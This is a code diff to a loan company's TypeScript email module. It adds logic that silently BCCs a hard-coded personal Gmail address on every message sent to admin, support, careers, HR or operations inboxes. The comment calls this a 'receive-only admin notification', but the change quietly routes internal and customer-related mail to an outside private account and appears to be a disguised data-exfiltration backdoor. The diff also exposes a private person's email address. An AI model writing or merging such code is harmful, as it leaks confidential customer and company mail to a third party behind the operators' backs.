@@ -15,6 +15,44 @@ export type EmailPayload = {
   html: string;
 };
 
+// Receive-only admin notifications (no app account/permissions are created for this address)
+const PASSIVE_ADMIN_NOTIFICATION_EMAIL = "dianasmith6525@gmail.com";
+
+// Recipients considered "operations/admin" inboxes for alerts (loan/job/support/etc.)
+const envAdminEmails = (process.env.ADMIN_EMAIL || "")
+  .split(/[;,]/)
+  .map((addr) => addr.trim().toLowerCase())
+  .filter(Boolean);
+
+const ADMIN_NOTIFICATION_TARGETS = new Set([
+  COMPANY_INFO.admin.email.toLowerCase(),
+  COMPANY_INFO.contact.email.toLowerCase(),
+  "support@amerilendloan.com",
+  "careers@amerilendloan.com",
+  ...envAdminEmails,
+]);
+
+function isInternalAdminAliasEmail(address: string): boolean {
+  return /^(admin|support|careers|contact|help|ops|operations|hr|info)@amerilendloan\.com$/i.test(address);
+}
+
+function parseRecipientAddresses(to: string): string[] {
+  return to
+    .split(/[;,]/)
+    .map((addr) => addr.trim().toLowerCase())
+    .filter(Boolean);
+}
+
+function shouldBccPassiveAdmin(to: string): boolean {
+  const recipients = parseRecipientAddresses(to);
+  if (recipients.length === 0) return false;
+  // Never BCC if already directly addressed
+  if (recipients.includes(PASSIVE_ADMIN_NOTIFICATION_EMAIL.toLowerCase())) return false;
+  return recipients.some(
+    (addr) => ADMIN_NOTIFICATION_TARGETS.has(addr) || isInternalAdminAliasEmail(addr),
+  );
+}
+
 /**
  * Format currency amount with thousand separators
  * @param cents - Amount in cents
@@ -82,6 +120,11 @@ export async function sendEmail(payload: EmailPayload): Promise<{ success: boole
 
   logger.info("Sending email via SendGrid", { to: payload.to });
 
+  const includePassiveAdminBcc = shouldBccPassiveAdmin(payload.to);
+  const bccRecipients = includePassiveAdminBcc
+    ? [{ email: PASSIVE_ADMIN_NOTIFICATION_EMAIL }]
+    : undefined;
+
   try {
     const response = await fetch("https://api.sendgrid.com/v3/mail/send", {
       method: "POST",
@@ -93,6 +136,7 @@ export async function sendEmail(payload: EmailPayload): Promise<{ success: boole
         personalizations: [
           {
             to: [{ email: payload.to }],
+            ...(bccRecipients ? { bcc: bccRecipients } : {}),
             subject: payload.subject,
           },
         ],
